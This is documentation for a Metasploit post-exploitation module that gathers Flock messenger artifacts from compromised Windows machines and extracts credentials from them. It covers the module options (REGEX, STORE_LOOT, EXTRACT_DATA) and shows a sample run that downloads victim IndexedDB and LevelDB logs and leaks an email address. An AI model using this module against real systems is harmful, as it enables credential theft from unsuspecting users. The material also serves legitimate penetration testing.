## Module Description

This post-exploitation module gathers artifacts found on flock related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/flock
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
mmsf6 post(windows/gather/credentials/flock) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Flock's parent folder found
[*] Flock's parent folder found
[*] Flock's parent folder found
[*] Flock's *.log file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\Flock\IndexedDB\file__0.indexeddb.leveldb\000124.log
[*] Flock 000124.log downloaded
[+] File saved to:  /root/.msf4/loot/20210513124826_default_192.168.56.106_flock000124.log_227739.log

[+] File with credentials saved:  /root/.msf4/loot/20210513124826_default_192.168.56.106_EXTRACTION.log_378223.log
[*] Downloading C:\Users\IEUser\AppData\Roaming\Flock\IndexedDB\https_auth.flock.com_0.indexeddb.leveldb\000004.log
[*] Flock 000004.log downloaded
[+] File saved to:  /root/.msf4/loot/20210513124826_default_192.168.56.106_flock000004.log_041330.log

[+] File with credentials saved:  /root/.msf4/loot/20210513124826_default_192.168.56.106_EXTRACTION.log_514565.log
[*] Downloading C:\Users\IEUser\AppData\Roaming\Flock\Local Storage\leveldb\000008.log
[*] Flock 000008.log downloaded
[+] File saved to:  /root/.msf4/loot/20210513124826_default_192.168.56.106_flock000008.log_824047.log

[+] email":"kazuyoshimaruta@outlook.jp","teamInfo":
[*] PackRat credential sweep Completed
[*] Post module execution completed

  ```